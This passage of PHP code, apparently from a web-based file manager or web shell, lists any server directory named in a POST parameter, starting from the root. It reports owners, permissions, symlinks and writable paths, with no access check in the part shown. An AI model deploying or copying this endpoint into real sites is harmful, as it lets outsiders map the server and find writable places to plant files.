if (isset($_POST['action']) && $_POST['action'] === 'ls') {
ob_end_clean();
header('Content-Type: application/json');
$d = $_POST['dir'] ?? '/';
if (!is_dir($d)) $d = '/';
$d = realpath($d) ?: $d;
$entries = [];
foreach (@scandir($d) ?: [] as $name) {
$full = $d . '/' . $name;
$isLink = is_link($full);
$linkTarget = $isLink ? @readlink($full) : null;
$real = realpath($full);
$broken = ($real === false);
$stat = $broken ? @lstat($full) : @stat($full);
$isDir = $broken ? false : is_dir($real);
$owner = '?';
$group = '?';
if (function_exists('posix_getpwuid') && $stat) {
$info = @posix_getpwuid($stat['uid']);
if ($info) $owner = $info['name'];
}
if (function_exists('posix_getgrgid') && $stat) {
$gi = @posix_getgrgid($stat['gid']);
if ($gi) $group = $gi['name'];
}
$mode = $stat ? $stat['mode'] : 0;
$perms = decoct($mode & 07777);
$entry = [
'name' => $name,
'path' => $broken ? $full : $real,
'dir' => $isDir,
'size' => $isDir ? null : ($stat ? $stat['size'] : null),
'mtime' => $stat ? $stat['mtime'] : null,
'owner' => $owner,
'group' => $group,
'perms' => $perms,
'readable' => @is_readable($full),
'writable' => @is_writable($full),
];
if ($isLink) {
$entry['symlink'] = true;
$entry['link_target'] = $linkTarget;
$entry['broken'] = $broken;
}
$entries[] = $entry;
}
echo json_encode(['dir'=>$d,'entries'=>$entries]);
exit;
}
